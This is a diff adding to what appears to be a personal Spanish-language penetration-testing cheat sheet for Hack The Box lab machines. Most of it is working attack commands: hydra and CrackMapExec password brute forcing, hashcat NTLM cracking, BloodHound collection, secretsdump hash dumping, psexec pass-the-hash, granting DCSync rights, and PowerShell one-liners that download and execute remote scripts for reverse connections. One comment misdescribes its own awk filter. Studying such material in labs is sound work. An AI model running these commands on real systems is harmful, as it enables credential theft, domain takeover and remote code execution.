@@ -26,6 +26,18 @@ nmap -p 22,80 -sC -sV -oA posion2 --script vuln --stylesheet nmap-bootstrap.xsl 
   hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "nibleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
   
+  Crack hashes kerberos ntlm
+  D:\hashcat-6.0.0>hashcat.exe --user -m 1000 ntlm.forest.txt rockyou.txt -r d:\hashcat-6.0.0\rules\InsidePro-PasswordsPro.rule -O
+  
+  crear diccionario con hashcat, primero se crea un archivo con las palabras, después se le agrega los caracteres en este caso 2019 y 2020 a cada palabra del diccionario.
+  for i in $(cat dictionary.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > dictionary.txt
+  
+  agregar caracteres al diccionario creado con hashcat
+  D:\hashcat-6.0.0>hashcat.exe --force --stdout dictionary.txt -r d:\hashcat-6.0.0\rules\best64.rule -r d:\hashcat-6.0.0\rules\toggles1.rule > dictionary2.txt
+ 
+ seleccionar las palabras de menos de 8 caracteres
+ cat dictionary2.txt | sort -u | awk 'length($0) > 8' | wc -l > dictionary2.txt
+
 
 ************************************************************* comandos para después de obtener una shell**
 Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.
@@ -131,6 +143,8 @@ lxc exec ignite /bin/sh
 smbclient -N -L \\10.10.10.27\\
 smbclient -N \\10.10.10.27\backups
 
+Crear una unidad de red para compartir con usuario y contraseña.
+impacket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia
 *********************************************************Tunnel ssh ****************************************
 ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
 L9000: Puerto local a publicar
@@ -264,4 +278,52 @@ Lanzar el reverse conection
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/diego.ps1')" -Credential $cred
 
 Probar para lanzar un reverse conection con los mismos privilegios
+
+************************************************Directorio activo máquina forest*********************************
+ataque de fuerza bruta en directorio activo
+crackmapexec smb 10.10.10.161 -u userslist.ldap -p dictionary2.txt
+
+Bloodhound
+SharpHound.exe -c all para extraer toda la información para analizar con bloodhound, la ejecución de este archivo debe realizarse dentro del servidor directorio activo.
+Generando archivos para bloodhound desde kali
+bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -ns 10.10.10.161
+bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+
+Lanzar bloodhound en kali
+neo4j console desde terminal
+bloodhound desde terminal pero con privlegios normales.
+
+Dumpear hashes:
+Con una cuenta con privilegios de ejecución de comando "ECHANGE WINDOWS PERMISSIONS es un grupo al que debe pertenecer el usuario para poder lograrlo.
+secretsdump.py htb/diego@10.10.10.161
+
+Conectar con psexec como administrador si se conoce el hash
+psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+Conectar con credenciales al servidor de directorio activo cuando se encuentra el puerto 5985 abierto.
+ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice 
+
+dentro de powershell
+Get-ADDomain htb.local para saber el SID de un dominio.
+
+Almacenar credenciales para conexiones bien sea de smb o para otras actividades con consola en reverso de powershell
+$pass = convertto-securestring 'Contrasenia' -AsPlainText -Force
+$pass
+$cred = New-Object System.Management.Automation.PSCredential('diego', $pass)
+$cred
+
+Mapar unidad de red con credenciales almacenados en powershell.
+New-PSDrive -Name diego -PSProvider FileSystem -Credential $cred -Root \\10.10.14.45\Sfire
+
+Buscar usuario de un directorio activo y sacarlos en un archivo
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > person.out
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}' >userlist.ldap
+
+después de haber creado un usuario y contraseña en el dominio, después de haberlo agregado a un grupo de administración, se ejecuta este comando, para extraer hashes con secretsdump.py
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+
+************************************************Enumeracion
+LinEnum.py en linux
+winPEAS.exe en windows
+Sherlocak.ps1 script para vulnerabilidaes echo IEX(New-Object Net.WebClient).downloadString("http://192.168.0.5/Sherlock.ps1") | powershell -noprofile -
 
